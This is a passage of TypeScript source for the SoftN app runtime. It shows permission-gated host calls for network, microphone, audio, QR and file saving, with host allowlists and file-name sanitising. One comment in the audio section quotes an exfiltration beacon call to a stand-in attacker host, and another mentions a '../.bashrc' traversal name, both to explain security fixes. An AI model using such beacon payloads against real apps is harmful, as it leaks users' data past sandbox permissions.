          // cannot answer it inside the app — it does not know where in a
          // bundle's layout a message belongs, and putting one there would be
          // inventing UI the bundle did not ask for. It could answer it on the
          // permission bar, which is the runtime's own surface and already on
          // screen; that needs a refusal callback threaded from here through
          // SoftNRenderer to the bar, and it is not built.
          console.warn(`[SoftN] ${call.kind} failed: ${String(err)}`);
        }

        // The engine may have been disposed while the host call was in flight.
        //
        // The guard at the top of this method ran before that await, and the
        // non-null assertions below are only true of the engine that was alive
        // then. A `softn.net.fetch` from a click handler, followed by an
        // unmount before it resolves, hit `drainPendingHostCalls()` on null in
        // a try/finally with no catch — an uncaught TypeError propagating out
        // through `createVMFunction`, which callers invoke without `.catch`.
        if (!this.vmEngine) return;

        // Re-acquire the lock to resolve the callback in the VM
        await this.vmCallLock;
        if (!this.vmEngine) return;
        let release: (() => void) | undefined;
        this.vmCallLock = new Promise<void>((r) => {
          release = r;
        });

        try {
          this.syncCallCache.clear();
          this.syncReactStateToVM();
          this.vmEngine!.resolveHostCallback(call.id, result);
          this.syncVMStateToReact();
        } catch (err) {
          console.error(`[SoftN] Error resolving host callback:`, err);
        } finally {
          release!();
        }
      }

      // Check for newly queued host calls (callback may have queued more)
      // Need the lock briefly to drain
      await this.vmCallLock;
      if (!this.vmEngine) return;
      let release2: (() => void) | undefined;
      this.vmCallLock = new Promise<void>((r) => {
        release2 = r;
      });
      try {
        pending = this.vmEngine.drainPendingHostCalls();
      } finally {
        release2!();
      }
    }
  }

  /**
   * Run one `host.call` on behalf of a script hosted elsewhere — the Web
   * Worker runtime's. The handlers need this thread (files, camera, mic,
   * audio, the network and its permission checks) and nothing of a VM, so an
   * instance that never loads a script serves them as they are.
   */
  executeHostCallExternal(call: PendingHostCall): Promise<unknown> {
    return this.executeHostCall(call);
  }

  private async executeHostCall(call: PendingHostCall): Promise<unknown> {
    switch (call.kind) {
      case 'net.fetch':
        return this.handleNetFetch(call);
      case 'qr.encode':
        return this.handleQrEncode(call);
      case 'qr.decode':
        return this.handleQrDecode(call);
      case 'camera.capturePhoto':
        return this.handleCameraCapture(call);
      case 'camera.recordVideo':
        return this.handleCameraRecord(call);
      case 'camera.startLive':
        return this.handleCameraStartLive(call);
      case 'camera.stopLive':
        return this.handleCameraStopLive();
      case 'mic.record':
        return this.handleMicRecord(call);
      case 'mic.stop':
        return this.handleMicStop();
      case 'mic.isRecording':
        return this.handleMicIsRecording();
      case 'audio.play':
        return this.handleAudioPlay(call);
      case 'audio.stop':
        return this.handleAudioStop(call);
      case 'audio.stopAll':
        return this.handleAudioStopAll();
      case 'audio.setVolume':
        return this.handleAudioSetVolume(call);
      case 'audio.whenEnded':
        return this.handleAudioWhenEnded(call);
      case 'files.pickFile':
        return this.handleFilesPickFile(call);
      case 'files.readText':
        return this.handleFilesReadText(call);
      case 'files.readBase64':
        return this.handleFilesReadBase64(call);
      case 'files.saveFile':
        return this.handleFilesSaveFile(call);
      case 'input.captureKeys':
        return this.handleInputCaptureKeys(call);
      case 'ai.getCapabilities':
        return this.handleAIGetCapabilities();
      case 'ai.onnx.loadModel':
        return this.handleAIOnnxLoadModel(call);
      case 'ai.onnx.run':
        return this.handleAIOnnxRun(call);
      case 'ai.onnx.release':
        return this.handleAIOnnxRelease(call);
      case 'ai.pipeline':
        return this.handleAIPipeline(call);
      case 'ai.generate':
        return this.handleAIGenerate(call);
      case 'ai.embed':
        return this.handleAIEmbed(call);
      case 'ai.classify':
        return this.handleAIClassify(call);
      case 'ai.run':
        return this.handleAIRun(call);
      case 'ai.releaseAll':
        return this.handleAIReleaseAll();
      case 'ai.model.load':
        return this.handleAIModelLoad(call);
      case 'ai.model.generate':
        return this.handleAIModelGenerate(call);
      case 'ai.model.release':
        return this.handleAIModelRelease(call);
      case 'ai.gpu.requestDevice':
        return this.handleGpuRequestDevice(call);
      case 'ai.gpu.createBuffer':
        return this.handleGpuCreateBuffer(call);
      case 'ai.gpu.writeBuffer':
        return this.handleGpuWriteBuffer(call);
      case 'ai.gpu.createShader':
        return this.handleGpuCreateShader(call);
      case 'ai.gpu.createPipeline':
        return this.handleGpuCreatePipeline(call);
      case 'ai.gpu.dispatch':
        return this.handleGpuDispatch(call);
      case 'ai.gpu.readBuffer':
        return this.handleGpuReadBuffer(call);
      case 'ai.gpu.release':
        return this.handleGpuRelease(call);
      case 'ai.gpu.releaseAll':
        return this.handleGpuReleaseAll();
      case 'storage.op':
        return this.handleStorageOp(call);
      default:
        throw new Error(`Unknown host call: ${call.kind}`);
    }
  }

  // ── Permission checks ──

  private checkPermission(capability: string): void {
    if (!this.permissionConfig) {
      // No permission.json means no capabilities. This used to allow everything
      // "for backward compatibility", which inverted the whole model: a bundle
      // that declared nothing got the network, the camera, the filesystem, AI
      // and the GPU with no prompt, while an honest bundle that declared what it
      // needed got a consent dialog the user could refuse. Declaring less bought
      // more. The user is never asked, because there is nothing to ask about —
      // the bundle claimed to need nothing.
      throw new Error(
        `${capability} access not permitted: this bundle ships no permission.json. ` +
          `Declare the capabilities it needs — { "permissions": { "${capability}": { "enabled": true } } } — ` +
          `so the user can see and approve them.`
      );
    }
    if (this.permissionConfig.consentPending) {
      // Running with everything withheld until the user answers the consent
      // bar. Deny like any other missing capability, but say why: the bundle
      // did declare this, so telling the author to declare it is a lie the
      // user cannot act on.
      throw new Error(
        `${capability} access not permitted yet: this app has asked for it and you have not allowed it. ` +
          `Choose Allow in the permission bar at the top of the app to grant it.`
      );
    }
    // Permission config IS set — deny by default for any capability not explicitly enabled.
    const perms = this.permissionConfig.permissions;
    switch (capability) {
      case 'net':
        if (!perms.net?.enabled)
          throw new Error('Network access not permitted. Add net.enabled to permission.json');
        break;
      case 'camera':
        if (!perms.camera?.enabled)
          throw new Error('Camera access not permitted. Add camera.enabled to permission.json');
        break;
      case 'mic':
        if (!perms.mic?.enabled)
          throw new Error('Microphone access not permitted. Add mic.enabled to permission.json');
        break;
      case 'files':
        if (!perms.files?.enabled)
          throw new Error('File access not permitted. Add files.enabled to permission.json');
        break;
      case 'qr':
        if (!perms.qr?.enabled)
          throw new Error('QR access not permitted. Add qr.enabled to permission.json');
        break;
      case 'ai':
        if (!perms.ai?.enabled)
          throw new Error('AI access not permitted. Add ai.enabled to permission.json');
        break;
      case 'gpu':
        if (!perms.gpu?.enabled)
          throw new Error('GPU compute access not permitted. Add gpu.enabled to permission.json');
        break;
      case 'sync':
        if (!perms.sync?.enabled)
          throw new Error('Sync not permitted. Add sync.enabled to permission.json');
        break;
      case 'storage':
        if (!perms.storage?.enabled)
          throw new Error('Server storage not permitted. Add storage.enabled to permission.json');
        break;
      case 'accel':
        if (!perms.accel?.enabled)
          throw new Error('Host acceleration not permitted. Add accel.enabled to permission.json');
        break;
      default:
        throw new Error(`Unknown capability: ${capability}. Add it to permission.json`);
    }
  }

  private checkNetHost(url: string): void {
    let parsed: URL;
    try {
      parsed = new URL(url);
    } catch {
      throw new Error(`Invalid URL: ${url}`);
    }

    // Always enforce scheme allowlist — even without permission config, reject
    // non-HTTP(S) schemes (e.g. file://, javascript:, data:) to prevent abuse.
    if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
      throw new Error(`Scheme not allowed: ${parsed.protocol}`);
    }

    const netPerms = this.permissionConfig?.permissions.net;
    // Default: HTTPS only unless allow_http is explicitly true
    if (!netPerms?.allow_http && parsed.protocol === 'http:') {
      throw new Error(
        `HTTP not allowed (only HTTPS). Set net.allow_http in permission.json to allow: ${url}`
      );
    }
    if (netPerms?.allowed_hosts && netPerms.allowed_hosts.length > 0) {
      if (!netPerms.allowed_hosts.includes(parsed.hostname)) {
        throw new Error(`Host not allowed: ${parsed.hostname}`);
      }
    }
  }

  // ── Host call handlers ──

  private async handleNetFetch(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('net');
    const [url, optionsJson] = call.args;
    this.checkNetHost(url);
    const options = optionsJson ? JSON.parse(optionsJson) : {};

    // Disable redirects to prevent allowlist bypass: a redirect from an
    // allowed host to an internal/disallowed host would skip checkNetHost.
    const requestedTimeout = Number(options.timeout);
    const timeoutMs = Number.isFinite(requestedTimeout)
      ? Math.max(1, Math.min(60_000, requestedTimeout))
      : 15_000;
    const abortController = new AbortController();
    const timeout = setTimeout(() => abortController.abort(), timeoutMs);
    this.netAbortControllers.add(abortController);

    try {
      const resp = await fetch(url, {
        method: options.method || 'GET',
        headers: options.headers,
        body: options.body ? JSON.stringify(options.body) : undefined,
        signal: abortController.signal,
        redirect: 'error',
      });

      const declaredHeader = resp.headers.get('content-length');
      const declaredLength = declaredHeader === null ? NaN : Number(declaredHeader);
      if (
        Number.isFinite(declaredLength) &&
        declaredLength > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES
      ) {
        try {
          await resp.body?.cancel();
        } catch {
          // Preserve the response-size error if the stream was disturbed.
        }
        throw new Error('Network response is too large');
      }

      let body: string;
      if (resp.body) {
        const reader = resp.body.getReader();
        const decoder = new TextDecoder();
        const textChunks: string[] = [];
        let total = 0;
        try {
          let next = await reader.read();
          while (!next.done) {
            if (next.value) {
              total += next.value.byteLength;
              if (total > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES) {
                try {
                  await reader.cancel();
                } catch {
                  // Preserve the response-size error if cancellation fails.
                }
                throw new Error('Network response is too large');
              }
              textChunks.push(decoder.decode(next.value, { stream: true }));
            }
            next = await reader.read();
          }
          textChunks.push(decoder.decode());
        } finally {
          reader.releaseLock();
        }
        body = textChunks.join('');
      } else {
        const bytes = await resp.arrayBuffer();
        if (bytes.byteLength > SoftNScriptRuntime.MAX_NET_RESPONSE_BYTES) {
          throw new Error('Network response is too large');
        }
        body = new TextDecoder().decode(bytes);
      }

      return {
        ok: resp.ok,
        status: resp.status,
        statusText: resp.statusText,
        body,
        headers: Object.fromEntries(resp.headers),
      };
    } finally {
      clearTimeout(timeout);
      this.netAbortControllers.delete(abortController);
    }
  }

  private async handleQrEncode(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('qr');
    const [text] = call.args;
    // Return the text — actual QR rendering is done by the QRCode component
    return { text, encoded: true };
  }

  private async handleQrDecode(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('qr');
    const [imageDataUrl] = call.args;
    // Use BarcodeDetector API if available
    if ('BarcodeDetector' in globalThis) {
      try {
        const detector = new (
          globalThis as unknown as {
            BarcodeDetector: new (opts: { formats: string[] }) => {
              detect: (img: HTMLImageElement) => Promise<Array<{ rawValue: string }>>;
            };
          }
        ).BarcodeDetector({ formats: ['qr_code'] });
        const img = new Image();
        await new Promise<void>((resolve, reject) => {
          let settled = false;
          let timeout: ReturnType<typeof setTimeout> | null = null;

          const finish = (error?: Error) => {
            if (settled) return;
            settled = true;
            if (timeout) clearTimeout(timeout);
            img.onload = null;
            img.onerror = null;
            this.qrDecodeCancelers.delete(cancel);
            if (error) {
              // Removing the source asks the browser to abandon any decode work
              // still associated with this detached image.
              img.removeAttribute('src');
              reject(error);
            } else {
              resolve();
            }
          };
          const cancel = () => finish(new Error('QR image load cancelled'));

          this.qrDecodeCancelers.add(cancel);
          img.onload = () => finish();
          img.onerror = () => finish(new Error('Could not load QR image'));
          timeout = setTimeout(
            () => finish(new Error('QR image load timed out')),
            SoftNScriptRuntime.QR_OPERATION_TIMEOUT_MS
          );
          img.src = imageDataUrl;
        });
        const results = await new Promise<Array<{ rawValue: string }>>((resolve, reject) => {
          let settled = false;
          const finish = (result?: Array<{ rawValue: string }>, error?: unknown) => {
            if (settled) return;
            settled = true;
            clearTimeout(timeout);
            this.qrDecodeCancelers.delete(cancel);
            if (error) reject(error);
            else resolve(result ?? []);
          };
          const cancel = () => finish(undefined, new Error('QR detection cancelled'));
          const timeout = setTimeout(
            () => finish(undefined, new Error('QR detection timed out')),
            SoftNScriptRuntime.QR_OPERATION_TIMEOUT_MS
          );

          this.qrDecodeCancelers.add(cancel);
          detector.detect(img).then(
            (result) => finish(result),
            (error) => finish(undefined, error)
          );
        });
        if (results.length > 0) {
          return { data: results[0].rawValue };
        }
      } catch {
        /* fallthrough */
      }
    }
    return { data: null, error: 'QR detection not available' };
  }

  private async handleCameraCapture(_call: PendingHostCall): Promise<unknown> {
    this.checkPermission('camera');
    // Camera capture is handled by the Camera component — this is a no-op
    // that tells the host to trigger the Camera component's capture
    return { pending: true, message: 'Use Camera component for capture' };
  }

  private async handleCameraRecord(_call: PendingHostCall): Promise<unknown> {
    this.checkPermission('camera');
    return { pending: true, message: 'Use Camera component for recording' };
  }

  private async handleCameraStartLive(_call: PendingHostCall): Promise<unknown> {
    this.checkPermission('camera');
    return { pending: true, message: 'Use Camera component for live mode' };
  }

  private async handleCameraStopLive(): Promise<unknown> {
    return { stopped: true };
  }

  // ── Microphone ──
  //
  // Gated, unlike audio playback. The comment below `── Audio ──` argues that
  // sound is a nuisance rather than a disclosure because "it reads nothing,
  // sends nothing" — a microphone is precisely the thing that fails that test.
  //
  // This is the script route, for an app that wants a recording without putting
  // a viewfinder on screen. The `<Microphone>` component is the other route and
  // opens the device itself, the same way `<Camera>` does; in both cases the
  // browser's own permission prompt is what stands in front of the hardware.

  /**
   * Record from the default input and return it as a WAV data URL.
   *
   * Raw PCM rather than MediaRecorder's Opus: see runtime/wav.ts. Options are
   * `seconds` (default 5), `sampleRate` (default 48000) and `processing`
   * (default true — echo cancellation, noise suppression and gain control,
   * which are right for speech and wrong for anything measuring the sound).
   */
  private async handleMicRecord(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('mic');

    if (this.micRecording || this.micAcquisition) {
      return { recorded: false, reason: 'already recording' };
    }
    if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
      return { recorded: false, reason: 'no microphone support' };
    }

    const [optionsJson] = call.args;
    const options = optionsJson
      ? (JSON.parse(optionsJson) as {
          seconds?: number;
          sampleRate?: number;
          processing?: boolean;
        })
      : {};

    const processing = options.processing !== false;
    const wantedRate =
      typeof options.sampleRate === 'number' && options.sampleRate > 0 ? options.sampleRate : 48000;
    // A cap the bundle declared is a promise to the user that the consent
    // dialog showed them, so it wins over whatever the script asks for.
    const declaredCap = this.permissionConfig?.permissions.mic?.maxSeconds;
    const requested =
      typeof options.seconds === 'number' && options.seconds > 0 ? options.seconds : 5;
    const seconds = Math.min(
      requested,
      typeof declaredCap === 'number' && declaredCap > 0 ? declaredCap : 300
    );

    const acquisition = { cancelled: false };
    this.micAcquisition = acquisition;

    let stream: MediaStream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: processing,
          noiseSuppression: processing,
          autoGainControl: processing,
          sampleRate: { ideal: wantedRate },
          channelCount: { ideal: 1 },
        },
      });
    } catch (err) {
      // A DOMException, which does not inherit from Error — reading `.message`
      // directly is what keeps "Permission denied" from becoming "failed".
      const name =
        typeof err === 'object' && err !== null
          ? ((err as { message?: string }).message ?? (err as { name?: string }).name)
          : undefined;
      if (this.micAcquisition === acquisition) this.micAcquisition = null;
      return { recorded: false, reason: name ?? 'could not open the microphone' };
    }

    if (this.micAcquisition === acquisition) this.micAcquisition = null;
    if (acquisition.cancelled || this.disposed) {
      stream.getTracks().forEach((track) => track.stop());
      return { recorded: false, reason: 'stopped' };
    }

    const AudioContextCtor =
      (
        globalThis as {
          AudioContext?: typeof AudioContext;
          webkitAudioContext?: typeof AudioContext;
        }
      ).AudioContext ??
      (globalThis as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
    if (!AudioContextCtor) {
      stream.getTracks().forEach((t) => t.stop());
      return { recorded: false, reason: 'no Web Audio support' };
    }

    // Asking the context for the rate is what actually resamples: the
    // getUserMedia constraint above is widely ignored, and a graph left at the
    // hardware rate would hand back 44100 samples labelled 48000.
    let context: AudioContext;
    try {
      try {
        context = new AudioContextCtor({ sampleRate: wantedRate });
      } catch {
        context = new AudioContextCtor();
      }
    } catch (err) {
      // Constructing an AudioContext can fail because the browser has reached
      // its context limit or disabled Web Audio. The microphone stream was
      // already granted at this point, so it must still be released.
      stream.getTracks().forEach((track) => track.stop());
      return { recorded: false, reason: String(err) };
    }
    const rate = context.sampleRate;

    const blocks: Float32Array[] = [];
    let total = 0;

    return new Promise<unknown>((resolve) => {
      let settled = false;
      let timer: ReturnType<typeof setTimeout> | null = null;
      let processor: ScriptProcessorNode | null = null;
      let source: MediaStreamAudioSourceNode | null = null;
      let sink: GainNode | null = null;

      const finish = (reason: 'complete' | 'stopped') => {
        if (settled) return;
        settled = true;
        if (timer) clearTimeout(timer);
        this.micRecording = null;

        if (processor) {
          processor.onaudioprocess = null;
          processor.disconnect();
        }
        if (source) source.disconnect();
        if (sink) sink.disconnect();
        void context.close().catch(() => {
          /* already closed */
        });
        stream.getTracks().forEach((t) => t.stop());

        const samples = new Float32Array(total);
        let offset = 0;
        for (const block of blocks) {
          samples.set(block, offset);
          offset += block.length;
        }

        resolve({
          recorded: total > 0,
          reason,
          dataUrl: pcmToWavDataUrl(samples, rate),
          sampleRate: rate,
          sampleCount: total,
          duration: total / rate,
          mimeType: 'audio/wav',
        });
      };

      try {
        source = context.createMediaStreamSource(stream);
        // ScriptProcessorNode rather than an AudioWorklet: a worklet has to be
        // loaded from a URL, and the only URL the runtime can mint for itself
        // is a blob — which a strict content security policy will refuse. The
        // component takes the worklet route and falls back to this one; here,
        // where there is no visible element to degrade, taking the reliable
        // route directly is worth the main-thread cost of a short recording.
        processor = context.createScriptProcessor(4096, 1, 1);
        processor.onaudioprocess = (event) => {
          if (settled) return;
          // The buffer belongs to the next callback, so it is copied, not kept.
          const block = event.inputBuffer.getChannelData(0);
          blocks.push(new Float32Array(block));
          total += block.length;
        };
        source.connect(processor);
        // A ScriptProcessorNode only runs while connected to something. A
        // zero-gain sink keeps it pulling without routing the microphone to the
        // speakers, which would be a feedback loop.
        sink = context.createGain();
        sink.gain.value = 0;
        processor.connect(sink);
        sink.connect(context.destination);
      } catch (err) {
        settled = true;
        stream.getTracks().forEach((t) => t.stop());
        void context.close().catch(() => {});
        resolve({ recorded: false, reason: String(err) });
        return;
      }

      this.micRecording = { stop: finish };
      timer = setTimeout(() => finish('complete'), Math.round(seconds * 1000));
    });
  }

  /** End a recording early. The pending `mic.record` callback still fires. */
  private async handleMicStop(): Promise<unknown> {
    if (this.micRecording) {
      this.micRecording.stop('stopped');
      return { stopped: true };
    }
    if (!this.micAcquisition) return { stopped: false, reason: 'not recording' };
    this.micAcquisition.cancelled = true;
    return { stopped: true };
  }

  private async handleMicIsRecording(): Promise<unknown> {
    return { recording: this.micRecording !== null || this.micAcquisition !== null };
  }

  /** Close any open microphone. Called from cleanup, and safe when idle. */
  private stopMicrophone(): void {
    if (this.micAcquisition) this.micAcquisition.cancelled = true;
    this.micRecording?.stop('stopped');
  }

  // ── Audio ──
  //
  // Playing a bundle's own sound needs no capability: a `blob:`, `data:` or
  // bundle-relative source carries its bytes with it, reads nothing and sends
  // nothing, and a template can write `<audio src=… autoPlay>` for the same
  // effect. A remote source is a different act. `new Audio(url)` issues the GET
  // whether or not autoplay policy lets the sound out, and `audio.whenEnded`
  // reports 'ended' separately from 'error' — so an unchecked remote src is not
  // only a beacon, it is a read-back oracle telling the bundle whether the
  // request succeeded. That is `softn.net.fetch` wearing a different name, and
  // it goes behind the same gate and the same allowed_hosts list.
  //
  // This comment used to say "sound is a nuisance, not a disclosure: it reads
  // nothing, sends nothing", and that reasoning was why no gate was here.
  // Proven wrong against the real runtime: with every capability withheld,
  // audio.play('https://attacker.example/beacon?secret=1') constructed the
  // element with that exact URL and answered {played:true}.

  /**
   * Turn whatever the script passed into something an <audio> can load.
   *
   * Scripts say `softn.audio.play("assets/blip.wav")` — a path inside their own
   * bundle, which only the host knows how to resolve. That is the same job
   * `asset()` does for templates, so it is the same function doing it.
   */
  private resolveAudioSrc(src: string): string {
    if (!src) return '';
    if (/^(blob:|data:|https?:)/i.test(src)) return src;
    const asset = this.externalFunctions?.asset;
    if (typeof asset === 'function') {
      const resolved = asset(src);
      if (typeof resolved === 'string' && resolved) return resolved;
    }
    return src;
  }

  private async handleAudioPlay(call: PendingHostCall): Promise<unknown> {
    if (typeof Audio === 'undefined') return { played: false, reason: 'no audio support' };

    const [rawSrc, optionsJson] = call.args;
    const options = optionsJson
      ? (JSON.parse(optionsJson) as {
          volume?: number;
          loop?: boolean;
          rate?: number;
        })
      : {};

    const src = this.resolveAudioSrc(rawSrc);
    if (!src) return { played: false, reason: `no such sound: ${rawSrc}` };

    // Checked on the resolved URL, not the argument: `asset()` answers with a
    // blob: or data: URL for a bundle path, and a path it does not recognise
    // comes back unchanged — including a protocol-relative `//host/x`, which
    // the browser resolves against the page's own http(s) scheme.
    if (isRemoteUrl(src)) {
      this.checkPermission('net');
      this.checkNetHost(src);
    }

    const el = new Audio(src);
    const own = typeof options.volume === 'number' ? Math.max(0, Math.min(1, options.volume)) : 1;
    el.volume = own * this.audioMasterVolume;
    el.loop = options.loop === true;
    if (typeof options.rate === 'number' && options.rate > 0) el.playbackRate = options.rate;

    const handle = `snd-${++this.audioSeq}`;
    // The sound's own volume is kept beside it: master volume scales it, and
    // reading it back off the element would fold the master in twice.
    this.audioPlaying.set(handle, { el, volume: own, watchers: [] });
    // One-shots clear themselves; loops stay until stopped or the app closes.
    el.addEventListener(
      'ended',
      () => {
        const outcome: AudioOutcome = { handle, status: 'ended' };
        if (Number.isFinite(el.duration)) outcome.durationMs = el.duration * 1000;
        this.finishAudio(handle, outcome);
      },
      { once: true }
    );
    // A src that fails to decode reports itself here, not through play() — a
    // watcher waiting on the sound would otherwise wait forever.
    el.addEventListener(
      'error',
      () => {
        this.finishAudio(handle, {
          handle,
          status: 'error',
          reason: el.error?.message || 'could not play',
        });
      },
      { once: true }
    );

    try {
      await el.play();
      return { played: true, handle };
    } catch (err) {
      const name =
        typeof err === 'object' && err !== null ? (err as { name?: string }).name : undefined;
      // Browsers refuse to make noise before the user has interacted with the
      // page. That is the policy working, not a fault, so it is reported rather
      // than thrown — and a soundtrack (anything looping) is held back and
      // started on the first gesture instead of being silently lost.
      if (name === 'NotAllowedError') {
        if (el.loop) {
          this.armAudioUnlock(handle, el);
          return { played: false, blocked: true, pending: true, handle };
        }
        this.audioPlaying.delete(handle);
        return {
          played: false,
          blocked: true,
          reason: 'the page has not been interacted with yet',
        };
      }
      this.audioPlaying.delete(handle);
      return { played: false, reason: name ?? 'could not play' };
    }
  }

  /** Start a blocked loop as soon as the user touches the page, once. */
  private armAudioUnlock(handle: string, el: HTMLAudioElement): void {
    if (typeof window === 'undefined') return;
    const start = () => {
      window.removeEventListener('pointerdown', start);
      window.removeEventListener('keydown', start);
      this.audioUnlockers.delete(start);
      // It may have been stopped, or the whole runtime torn down, while waiting.
      if (this.disposed || !this.audioPlaying.has(handle)) return;
      el.play().catch(() => {
        this.finishAudio(handle, { handle, status: 'error', reason: 'could not play' });
      });
    };
    this.audioUnlockers.add(start);
    window.addEventListener('pointerdown', start, { once: true });
    window.addEventListener('keydown', start, { once: true });
  }

  /**
   * The one place a sound becomes past tense: watchers hear the outcome, the
   * handle stops being live, and the outcome is kept for late askers. First
   * outcome wins — a stop landing after an error, or the 'error' that clearing
   * `src` on teardown fires, must not rewrite what already happened.
   */
  private finishAudio(handle: string, outcome: AudioOutcome): void {
    const sound = this.audioPlaying.get(handle);
    if (!sound) return;
    for (const watcher of sound.watchers) watcher(outcome);
    this.audioPlaying.delete(handle);
    this.audioFinished.set(handle, outcome);
    if (this.audioFinished.size > SoftNScriptRuntime.MAX_AUDIO_FINISHED) {
      const oldest = this.audioFinished.keys().next().value;
      if (oldest !== undefined) this.audioFinished.delete(oldest);
    }
  }

  private async handleAudioStop(call: PendingHostCall): Promise<unknown> {
    const [handle] = call.args;
    if (!handle) return this.handleAudioStopAll();
    const sound = this.audioPlaying.get(handle);
    if (!sound) return { stopped: false };
    sound.el.pause();
    sound.el.currentTime = 0;
    this.finishAudio(handle, { handle, status: 'stopped' });
    return { stopped: true };
  }

  private async handleAudioStopAll(): Promise<unknown> {
    const count = this.audioPlaying.size;
    this.stopAllAudio();
    return { stopped: count };
  }

  private async handleAudioSetVolume(call: PendingHostCall): Promise<unknown> {
    const value = Number(call.args[0]);
    if (!Number.isFinite(value)) return { volume: this.audioMasterVolume };
    this.audioMasterVolume = Math.max(0, Math.min(1, value));
    // Applies to what is already playing too, or turning the music down would
    // only take effect on the next sound.
    for (const sound of this.audioPlaying.values()) {
      sound.el.volume = sound.volume * this.audioMasterVolume;
    }
    return { volume: this.audioMasterVolume };
  }

  /**
   * Resolves when the sound is over, with how it got there: 'ended' on its
   * own, 'stopped' by a script or teardown, 'error' if it never could play.
   * The distinction is the point — being cut off must never read as having
   * finished. A handle nothing remembers answers immediately: whatever it
   * once named, it is not playing now.
   */
  private async handleAudioWhenEnded(call: PendingHostCall): Promise<unknown> {
    const [handle] = call.args;
    const finished = this.audioFinished.get(handle);
    if (finished) return finished;
    const sound = this.audioPlaying.get(handle);
    if (!sound) return { handle, status: 'ended', known: false };
    return new Promise<AudioOutcome>((resolve) => {
      sound.watchers.push(resolve);
    });
  }

  private stopAllAudio(): void {
    for (const [handle, { el }] of this.audioPlaying) {
      try {
        el.pause();
        el.src = '';
      } catch {
        // The element may already be detached; nothing left to stop.
      }
      this.finishAudio(handle, { handle, status: 'stopped' });
    }
    this.audioPlaying.clear();
    if (typeof window !== 'undefined') {
      for (const unlock of this.audioUnlockers) {
        window.removeEventListener('pointerdown', unlock);
        window.removeEventListener('keydown', unlock);
      }
    }
    this.audioUnlockers.clear();
  }

  private async handleFilesPickFile(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('files');
    const options = call.args[0] ? JSON.parse(call.args[0]) : {};
    return new Promise<unknown>((resolve) => {
      const input = document.createElement('input');
      input.type = 'file';
      if (options.accept) input.accept = options.accept;
      if (options.multiple) input.multiple = true;
      input.onchange = () => {
        const files = Array.from(input.files || []);
        const result = files.map((f) => ({
          name: f.name,
          size: f.size,
          type: f.type,
          ref: registerFileRef(f),
        }));
        resolve(result);
      };
      input.oncancel = () => resolve([]);
      input.click();
    });
  }

  private async handleFilesReadText(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('files');
    const [fileRef] = call.args;
    const file = getFileByRef(fileRef);
    if (!file) throw new Error(`File not found: ${fileRef}`);
    return await file.text();
  }

  private async handleFilesReadBase64(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('files');
    const [fileRef] = call.args;
    const file = getFileByRef(fileRef);
    if (!file) throw new Error(`File not found: ${fileRef}`);
    return new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = () => reject(new Error('Failed to read file'));
      reader.readAsDataURL(file);
    });
  }

  /**
   * Save a file the app produced: the content becomes a Blob and the browser's
   * own download handles the rest, so where it lands and whether it is
   * confirmed is the user's setting, not the app's. Text by default; with
   * `base64: true` the content is decoded to bytes first, which is how an
   * app hands over an image or a zip. Gated with the other file calls: an
   * app that may open the user's files may also give them one.
   */
  /**
   * `softn.input.captureKeys(keys)`: the keys whose browser default the
   * window bridge cancels before the script's handler sees them. Not a
   * gated capability: it changes nothing but the page the app already
   * owns, and never touches a text field or a browser chord.
   */
  private async handleInputCaptureKeys(call: PendingHostCall): Promise<unknown> {
    const keys = parseCapturedKeys(call.args[0]);
    setCapturedKeys(keys);
    return { captured: keys.length };
  }

  private async handleFilesSaveFile(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('files');
    const [rawName, content, optionsJson] = call.args;
    let options: { mime?: string; base64?: boolean } = {};
    if (optionsJson) {
      try {
        options = JSON.parse(optionsJson) as { mime?: string; base64?: boolean };
      } catch {
        return { error: 'The save options are not valid JSON.' };
      }
    }
    // A file name is a leaf, never a path: strip separators and control
    // characters so an app cannot suggest "../.bashrc" to the download dialog.
    const name = String(rawName || 'download')
      .replace(/[\\/:*?"<>|\u0000-\u001f]/g, '_')
      .replace(/^\.+/, '')
      .slice(0, 200) || 'download';
    const mime = typeof options.mime === 'string' && options.mime ? options.mime : (options.base64 ? 'application/octet-stream' : 'text/plain;charset=utf-8');
    let blob: Blob;
    if (options.base64) {
      let buffer: ArrayBuffer;
      try {
        const bin = atob(String(content || '').replace(/^data:[^,]*,/, ''));
        buffer = new ArrayBuffer(bin.length);
        const bytes = new Uint8Array(buffer);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      } catch {
        return { error: 'The content is not valid base64.' };
      }
      blob = new Blob([buffer], { type: mime });
    } else {
      blob = new Blob([String(content ?? '')], { type: mime });
    }
    if (typeof document === 'undefined' || typeof URL === 'undefined' || typeof URL.createObjectURL !== 'function') {
      return { error: 'Saving files is not available here.' };
    }
    const url = URL.createObjectURL(blob);
    try {
      const a = document.createElement('a');
      a.href = url;
      a.download = name;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      a.remove();
    } finally {
      // The click has started the download; the URL only needs to outlive it.
      setTimeout(() => URL.revokeObjectURL(url), 30_000);
    }
    return { ok: true, name, size: blob.size };
  }

  // ── Server storage (softn.storage.*) ──

  /**
   * One operation against the app's own database on the directory that
   * published it. The runtime knows nothing of SQL: the script asks for
   * records and keys, the request carries the operation and its arguments as
   * JSON, and the server enforces its quotas and its limits. An app opened
   * from a file rather than from a directory has no endpoint and is told so,
   * in the same `{error}` shape every other refused call uses.
   */
  private async handleStorageOp(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('storage');
    const [op, argsJson] = call.args;
    if (!this.storageEndpoint) {
      return {
        error: 'This app has no server storage: it was not opened from a directory that publishes it.',
      };
    }
    let args: Record<string, unknown> = {};
    if (argsJson) {
      try {
        args = JSON.parse(argsJson) as Record<string, unknown>;
      } catch {
        return { error: 'The storage arguments are not valid JSON.' };
      }
    }
